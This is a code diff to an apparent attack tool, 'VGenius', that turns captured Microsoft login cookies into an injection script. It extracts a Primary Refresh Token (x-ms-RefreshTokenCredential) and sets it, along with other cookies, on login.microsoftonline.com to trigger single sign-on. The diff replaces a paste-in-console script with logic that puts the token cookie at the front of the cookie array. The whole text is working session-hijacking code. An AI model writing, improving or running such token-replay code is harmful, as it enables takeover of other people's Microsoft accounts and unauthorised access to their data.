@@ -624,43 +624,34 @@ function generatePopupScript(cookies) {
 // Direct injection script - works on login.microsoftonline.com page
 // Sets cookies for current domain then redirects to trigger SSO
 function generateDirectInjectionScript(cookies, prtScript) {
-  // If we have a PRT script, use that as the primary method (most reliable)
+
+  // If we have a PRT script, add the PRT cookie to the cookies array (most important for SSO)
+
   if (prtScript) {
-    // Extract the PRT value from the script
+
     var prtValue = (prtScript.match(/x-ms-RefreshTokenCredential=([^;]+)/) || ['', ''])[1];
 
-    var prtOutput = '// VGenius PRT Cookie Injection Script\n';
-    prtOutput += '// IMPORTANT: Paste this in the browser console on login.microsoftonline.com\n';
-    prtOutput += '// The PRT cookie will be set and you will be redirected to authenticate\n';
-    prtOutput += '(function() {\n';
-    prtOutput += '  "use strict";\n';
-    prtOutput += '  console.log("[VGenius] Injecting PRT cookie...");\n';
-    prtOutput += '  \n';
-    prtOutput += '  // Set the PRT cookie without domain (works on current page)\n';
-    prtOutput += '  // This is the Primary Refresh Token that Microsoft uses for SSO\n';
-    prtOutput += '  try {\n';
-    prtOutput += '    // First, set the cookie without domain attribute\n';
-    prtOutput += '    document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; path=/; Secure; SameSite=None";\n';
-    prtOutput += '    console.log("[VGenius] PRT cookie set successfully!");\n';
-    prtOutput += '    \n';
-    prtOutput += '    // Also try setting with the current page domain\n';
-    prtOutput += '    var currentDomain = window.location.hostname;\n';
-    prtOutput += '    if (currentDomain) {\n';
-    prtOutput += '      document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; domain=." + currentDomain + "; path=/; Secure; SameSite=None";\n';
-    prtOutput += '      console.log("[VGenius] PRT cookie set for domain: " + currentDomain);\n';
-    prtOutput += '    }\n';
-    prtOutput += '  } catch(e) {\n';
-    prtOutput += '    console.error("[VGenius] Failed to set PRT cookie:", e);\n';
-    prtOutput += '  }\n';
-    prtOutput += '  \n';
-    prtOutput += '  // Redirect to Microsoft auth endpoint to trigger SSO\n';
-    prtOutput += '  console.log("[VGenius] Redirecting to authenticate...");\n';
-    prtOutput += '  setTimeout(function() {\n';
-    prtOutput += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-    prtOutput += '  }, 1500);\n';
-    prtOutput += '})();\n';
-    return prtOutput;
+    if (prtValue && !cookies.some(function(c) { return c.name === 'x-ms-RefreshTokenCredential'; })) {
+
+      cookies.unshift({
+
+        name: 'x-ms-RefreshTokenCredential',
+
+        value: prtValue,
+
+        domain: '.login.microsoftonline.com',
+
+        path: '/',
+
+        sameSite: 'None'
+
+      });
+
+    }
+
   }
+
+
 
   if (!cookies || cookies.length === 0) {
     return '';
